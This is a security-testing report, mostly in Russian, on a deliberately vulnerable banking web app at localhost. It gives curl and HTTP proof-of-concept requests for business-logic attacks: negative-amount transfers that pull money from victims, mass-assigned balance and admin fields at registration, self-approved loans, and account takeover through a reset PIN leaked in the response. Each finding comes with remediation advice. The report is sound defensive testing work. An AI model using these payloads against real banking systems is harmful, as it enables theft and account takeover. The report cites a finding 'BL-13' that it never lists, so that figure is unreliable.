# Business Logic Testing Report: VulnBank
**Таргет:** http://localhost:5050  
**Дата:** 2026-04-12  
**Метод:** Web Application Logic Testing (web-app-logic skill)  
**Фокус:** Финансовые операции, кредиты, аккаунт-управление

---

## Сводка

| ID | Уязвимость | Severity | CWE | Статус |
|----|-----------|---------|-----|--------|
| BL-01 | Negative Transfer — кража денег | Critical | CWE-840 | ✅ Confirmed |
| BL-04 | Mass Assignment balance при регистрации | Critical | CWE-915 | ✅ Confirmed |
| BL-06 | Self-approve loan (BOPLA + loan workflow) | Critical | CWE-285 | ✅ Confirmed |
| BL-09 | Account Takeover через leaked PIN | Critical | CWE-640 | ✅ Confirmed |
| BL-12 | Unlimited loans без лимита и без возврата | High | CWE-841 | ✅ Confirmed |
| BL-05 | Transfer to non-existent account — money destruction | High | CWE-840 | ✅ Confirmed |
| BL-08 | Float precision — баланс с бесконечным хвостом | Medium | CWE-682 | ✅ Confirmed |
| BL-14 | Ghost account transfer (деньги исчезают) | Medium | CWE-840 | ✅ Confirmed |

---

## Полная цепочка атаки: $0 → $803,399

```
Шаг 1: POST /register {"balance": 9999999}          # BL-04: старт с $9.9M
         ИЛИ
         POST /register {"is_admin": true}            # BOPLA admin

Шаг 2 (если admin): POST /request_loan {"amount": 500000}  # Запрос кредита
         POST /admin/approve_loan/{id}               # Сам одобряет

Шаг 3 (если нужно): POST /transfer {"amount": -10000}    # BL-01: кража у других

Итог: аттакер получает произвольную сумму без ограничений
```

**Реальный результат тестирования:**  
Стартовый баланс: $1000 → Финальный: **$803,399** (+$802,399 через BL-01 + BL-06 + BL-13)

---

## Детали уязвимостей

---

### BL-01: Negative Transfer Amount — прямая кража денег
**Severity:** CRITICAL | **CWE:** CWE-840 (Business Logic Errors)

**Описание:**  
Endpoint `/transfer` не валидирует знак суммы. Перевод отрицательной суммы `from A to B` работает в обратную сторону: деньги перетекают `from B to A`.

**PoC:**
```bash
# Attacker переводит -500 жертве → получает +500, жертва теряет -500
curl -X POST http://localhost:5050/transfer \
  -H "Authorization: Bearer <attacker_token>" \
  -d '{"from_account":"7556229114","to_account":"8717432571","amount":-500}'
# Response: {"new_balance": 3500.0}  ← attacker баланс вырос
# Victim: 1000 → 500  ← victim потерял деньги
```

**Доказательство:**
```
до:  attacker=$3000, victim=$1000
PoC: transfer -500 from attacker to victim
после: attacker=$3500 (+500), victim=$500 (-500)
```

**Remediation:** `if amount <= 0: return error`. Валидировать `amount > 0` на уровне API.

---

### BL-04: Mass Assignment — произвольный баланс при регистрации
**Severity:** CRITICAL | **CWE:** CWE-915

**Описание:**  
Поле `balance` принимается при регистрации без whitelist фильтрации. Атакующий регистрируется сразу с миллионным балансом.

**PoC:**
```bash
curl -X POST http://localhost:5050/register \
  -d '{"username":"rich_hacker","password":"x","balance":9999999}'
# Response: {"balance": 9999999.0, "fields_registered": ["username","password","account_number","balance"]}
```

**Remediation:** Whitelist: `ALLOWED_REGISTER_FIELDS = {'username', 'password'}`. Баланс — только серверная константа ($1000 по умолчанию).

---

### BL-06: Self-Approve Loan (BOPLA + Broken Loan Workflow)
**Severity:** CRITICAL | **CWE:** CWE-285 (Improper Authorization)

**Описание:**  
Комбинация двух уязвимостей:
1. BOPLA: регистрация с `is_admin: true` → admin-аккаунт
2. Нет separation of duty: тот же пользователь может запросить и одобрить кредит

**PoC:**
```bash
# Step 1: стать admin (или через BOPLA при регистрации)
POST /register {"username":"x","password":"x","is_admin":true}
POST /login → admin_token

# Step 2: запросить кредит
POST /request_loan {"amount": 500000, "reason": "..."} → loan_id=6

# Step 3: одобрить собственный кредит
POST /admin/approve_loan/6 -H "Authorization: Bearer admin_token"
# → баланс +$500,000
```

**Реальный результат:**  
- loan_id=6: +$200,000  
- loan_id=7: +$500,000  
- Итого: **+$700,000 за 3 запроса**

**Remediation:** Loan approver не может быть тем же пользователем что запросил. Хранить `requested_by`, проверять `approver_id != requester_id`.

---

### BL-09: Account Takeover через PIN из response
**Severity:** CRITICAL | **CWE:** CWE-640 (Weak Password Recovery)

**Описание:**  
`POST /api/v1/forgot-password` возвращает reset PIN прямо в JSON-ответе (в `debug_info.pin`). Атакующий немедленно использует PIN для смены пароля жертвы без доступа к email.

**PoC:**
```bash
# Step 1: получить PIN из response
curl -X POST http://localhost:5050/api/v1/forgot-password \
  -d '{"username":"victim_idor"}'
# Response: {"debug_info": {"pin": "349", "pin_length": 3, ...}}

# Step 2: сменить пароль жертвы
curl -X POST http://localhost:5050/api/v1/reset-password \
  -d '{"username":"victim_idor","reset_pin":"349","new_password":"Hacked123!"}'
# Response: {"reset_success": true}

# Step 3: логин под жертвой
curl -X POST http://localhost:5050/login -d '{"username":"victim_idor","password":"Hacked123!"}'
# → valid JWT token, полный доступ к аккаунту жертвы
```

**Доп. проблемы:**
- PIN из 3 цифр: только 900 вариантов → брутфорс за < 1 секунды
- Нет rate limiting на `/api/v1/reset-password`
- PIN не инвалидируется после одного использования (не проверено)

**Remediation:** Убрать PIN из response. Использовать `secrets.token_urlsafe(32)`. Отправлять только через email. Rate limit 3 попытки/15 мин.

---

### BL-12: Unlimited Loans — нет лимита суммы и количества
**Severity:** HIGH | **CWE:** CWE-841 (Improper Enforcement of Behavioral Workflow)

**Описание:**  
Нет ограничений на: сумму кредита, количество одновременных кредитов, наличие непогашенных кредитов. Нет проверки creditworthiness.

**PoC:**
```bash
# Три кредита подряд без ограничений
POST /request_loan {"amount": 100000}  → success
POST /request_loan {"amount": 200000}  → success
POST /request_loan {"amount": 500000}  → success
# Все одобряются через admin panel
```

**Remediation:** Максимальная сумма кредита. Лимит активных кредитов на пользователя. Проверка баланса/creditworthiness.

---

### BL-05: Transfer to Non-Existent Account
**Severity:** HIGH | **CWE:** CWE-840

**Описание:**  
Перевод на несуществующий аккаунт проходит успешно — деньги списываются с отправителя, но никуда не поступают (уничтожаются или зависают в БД).

**PoC:**
```bash
curl -X POST http://localhost:5050/transfer \
  -d '{"from_account":"7556229114","to_account":"0000000000","amount":100}'
# → "Transfer Completed", new_balance уменьшился, деньги исчезли
```

**Remediation:** Проверять существование `to_account` до выполнения транзакции. Возвращать ошибку если получатель не найден.

---

### BL-08: Float Precision — некорректные балансы
**Severity:** MEDIUM | **CWE:** CWE-682 (Incorrect Calculation)

**Описание:**  
Операции с малыми float числами оставляют бесконечные десятичные хвосты в балансе.

**PoC:**
```bash
curl -X POST http://localhost:5050/transfer \
  -d '{"amount": 0.000000001}'
# → new_balance: 103399.999999999
```

**Remediation:** Использовать `DECIMAL(15,2)` в PostgreSQL. Округлять до 2 знаков при каждой операции: `ROUND(balance::numeric, 2)`.

---

### BL-14: Ghost Account Transfer — деньги исчезают
**Severity:** MEDIUM | **CWE:** CWE-840

**Описание:**  
Транзакция на несуществующий счёт проходит — баланс отправителя уменьшается, но деньги нигде не появляются. Запись в `transactions` создаётся с несуществующим получателем.

**Remediation:** Валидация получателя ПЕРЕД изменением баланса отправителя. Атомарная транзакция с rollback.

---

## Сравнение с предыдущими методами

| Уязвимость | IDOR-test | Static | Business Logic |
|-----------|-----------|--------|----------------|
| Negative transfer | ❌ | ❌ | ✅ **НОВОЕ** |
| Mass assignment balance | ❌ | ✅ (код) | ✅ **ПОДТВЕРЖДЕНО** |
| Self-approve loan | ❌ | ❌ | ✅ **НОВОЕ** |
| PIN ATO | ❌ | ✅ (код) | ✅ **ПОДТВЕРЖДЕНО + PoC** |
| Unlimited loans | ❌ | ❌ | ✅ **НОВОЕ** |
| Ghost account transfer | ❌ | ❌ | ✅ **НОВОЕ** |
| Race condition | ❌ | ✅ (код) | ✅ (ранее подтверждено) |

**3 новых уязвимости**, не найденных ни IDOR-тестом, ни static review.
